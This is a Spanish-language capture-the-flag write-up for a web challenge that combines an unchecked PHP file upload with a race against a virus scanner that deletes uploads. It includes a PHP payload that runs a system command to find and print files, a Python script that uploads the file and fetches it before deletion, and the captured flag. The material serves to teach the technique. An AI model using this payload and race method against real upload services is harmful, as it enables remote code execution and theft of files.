# Write-up: Hachuu (Web Exploitation)

**Categoría:** Web / Race Condition
**Dificultad:** Media
**Objetivo:** Conseguir ejecución de código remoto (RCE) para leer la flag.

## 1. Reconocimiento y Análisis

Nos enfrentamos a un servicio de subida de archivos ("Hachuu File Upload Service"). Se nos proporcionó el código fuente de `upload.php`.

### Análisis de Código (`upload.php`)
Al revisar el código, identificamos varios puntos clave:
1.  **Falta de Validación:** El script calcula la extensión del archivo (`$fileType`) pero **nunca verifica** si es válida. Permite subir cualquier cosa, incluyendo `.php`.
2.  **Disclosure de Ruta:** Si la subida es exitosa, el servidor redirige a `index.php` con un mensaje que contiene el nombre exacto del archivo guardado (que incluye un prefijo aleatorio):
    ```php
    $message = "Success: File uploaded as " . basename($uploadPath);
    header("Location: index.php?message=" . urlencode($message));
    ```
3.  **Advanced Virus Scanning:** El sitio web menciona que todas las subidas son escaneadas. Esto explica por qué los archivos desaparecen (404 Not Found) casi instantáneamente tras ser subidos.

## 2. Estrategia de Explotación: Race Condition

Dado que el archivo se escribe en disco (`move_uploaded_file`) y luego es eliminado por un proceso de limpieza (el escáner), existe una pequeña ventana de tiempo en la que el archivo existe y es ejecutable. Esto se conoce como una vulnerabilidad de **Race Condition**.

Para ganar esta carrera contra el "limpiador", aplicamos dos tácticas:
1.  **Payload Pesado (Junk Data):** Subimos un archivo de aproximadamente **950KB**. Esto obliga al servidor a pasar más tiempo realizando operaciones de I/O, hashing (SHA256) y escaneo, lo que ensancha ligeramente la ventana de ejecución.
2.  **Optimización de Latencia:** Usamos un script en Python que evita seguir redirecciones y realiza la petición GET de forma inmediata tras recibir la confirmación de subida.

## 3. El Exploit

### Payload PHP
Usamos un comando de sistema para buscar y leer cualquier archivo que empiece por "flag".

```php
<?php
/* [950KB de comentarios basura] */
system("find / -name 'flag*' -exec cat {} +");
?>
```

### Ejecución
El exploit automatiza el proceso de subir el archivo, parsear el nombre generado aleatoriamente desde la cabecera `Location` de HTTP, y solicitar el archivo antes de su borrado.

```python
# Resumen del script race_adapted.py
import requests
import re

# ... (configuración de sesión y payload pesado)

# 1. Subir archivo
r = requests.post(UPLOAD_URL, files=files, data=data, allow_redirects=False)

# 2. Extraer nombre del header Location
location = r.headers['Location']
filename = re.search(r"File uploaded as (.*php)", location).group(1)

# 3. Acceso inmediato (La Carrera)
r_shell = requests.get(f"{UPLOADS_DIR}/{filename}")
```

## 4. Resultado

Al ejecutar el ataque, logramos interceptar la ejecución del archivo `.php` justo antes de ser eliminado por el antivirus del servidor.

**Flag encontrada:**
`RE:CTF{gr4ttzzz_y0u_l34rn3d_r4c3_c0nd1t10n_thr0ugh_f1l3_upl04d_anarchist_was_hereeee}`

---
**Conclusión:**
Este reto demuestra que las medidas de seguridad reactivas (como el borrado de archivos) pueden ser evadidas si existe un desfase temporal entre la creación del recurso y su eliminación. El uso de archivos grandes para ralentizar el procesamiento del lado del servidor es una técnica clásica de "Race Condition broadening".
